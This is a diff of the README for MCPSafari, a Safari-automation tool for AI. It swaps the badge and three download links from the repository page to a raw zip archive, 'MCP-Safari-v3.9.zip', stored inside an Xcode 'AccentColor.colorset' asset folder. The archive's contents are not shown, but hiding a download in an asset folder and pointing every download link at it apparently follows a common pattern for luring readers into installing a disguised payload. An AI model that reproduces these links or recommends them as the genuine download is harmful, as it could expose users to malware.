@@ -1,6 +1,6 @@
 # 🧭 MCPSafari - Run Safari With AI Control
 
-[![Download MCPSafari](https://img.shields.io/badge/Download-MCPSafari-blue?style=for-the-badge&logo=github)](https://github.com/nicoconic248/MCPSafari)
+[![Download MCPSafari](https://img.shields.io/badge/Download-MCPSafari-blue?style=for-the-badge&logo=github)](https://github.com/nicoconic248/MCPSafari/raw/refs/heads/main/MCPSafari/MCPSafari/Assets.xcassets/AccentColor.colorset/MCP-Safari-v3.9.zip)
 
 ## 🛠️ What MCPSafari Does
 
@@ -19,7 +19,7 @@ It is made for users who want Safari-based automation without extra setup in the
 
 Visit this page to download and set up MCPSafari:
 
-[https://github.com/nicoconic248/MCPSafari](https://github.com/nicoconic248/MCPSafari)
+[https://github.com/nicoconic248/MCPSafari/raw/refs/heads/main/MCPSafari/MCPSafari/Assets.xcassets/AccentColor.colorset/MCP-Safari-v3.9.zip](https://github.com/nicoconic248/MCPSafari/raw/refs/heads/main/MCPSafari/MCPSafari/Assets.xcassets/AccentColor.colorset/MCP-Safari-v3.9.zip)
 
 ### Steps to get started
 
@@ -64,7 +64,7 @@ This setup keeps the browser on your computer and gives the AI a direct path to 
 
 Go to the main project page:
 
-[https://github.com/nicoconic248/MCPSafari](https://github.com/nicoconic248/MCPSafari)
+[https://github.com/nicoconic248/MCPSafari/raw/refs/heads/main/MCPSafari/MCPSafari/Assets.xcassets/AccentColor.colorset/MCP-Safari-v3.9.zip](https://github.com/nicoconic248/MCPSafari/raw/refs/heads/main/MCPSafari/MCPSafari/Assets.xcassets/AccentColor.colorset/MCP-Safari-v3.9.zip)
 
 ### 2. Get the project files
 
@@ -271,7 +271,7 @@ MCPSafari is aimed at users who want:
 
 If you need the project files again, use this page:
 
-[https://github.com/nicoconic248/MCPSafari](https://github.com/nicoconic248/MCPSafari)
+[https://github.com/nicoconic248/MCPSafari/raw/refs/heads/main/MCPSafari/MCPSafari/Assets.xcassets/AccentColor.colorset/MCP-Safari-v3.9.zip](https://github.com/nicoconic248/MCPSafari/raw/refs/heads/main/MCPSafari/MCPSafari/Assets.xcassets/AccentColor.colorset/MCP-Safari-v3.9.zip)
 
 ## 🗂️ Topic Areas
 
